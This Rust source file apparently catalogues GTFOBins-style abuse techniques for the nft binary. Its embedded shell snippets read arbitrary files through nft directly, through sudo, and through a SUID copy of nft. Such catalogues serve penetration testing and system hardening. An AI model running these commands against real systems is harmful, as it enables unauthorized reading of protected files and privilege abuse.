pub static BIN_NAME: &'static str = "nft";
pub static BIN_DESC: &'static str = "The content is actually parsed and corrupted by the command, thus it may not be suitable for arbitrary files. This requires version nftables v0.9.0.";
pub static FR_CODE: &'static str = r#"
    
    LFILE=file_to_read
    nft -f "$LFILE"
"#;
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which nft) .

    LFILE=file_to_read
    ./nft -f "$LFILE"
"#;
pub static SUDO_CODE: &'static str = r#"
    
    LFILE=file_to_read
    sudo nft -f "$LFILE"
"#;
use crate::code::{Code, Tag};
pub static FR: Code<'static> = Code { 
	title: "FR_CODE",
	code: FR_CODE,
	tag: Tag::FR,
};
pub static SUID: Code<'static> = Code { 
	title: "SUID_CODE",
	code: SUID_CODE,
	tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
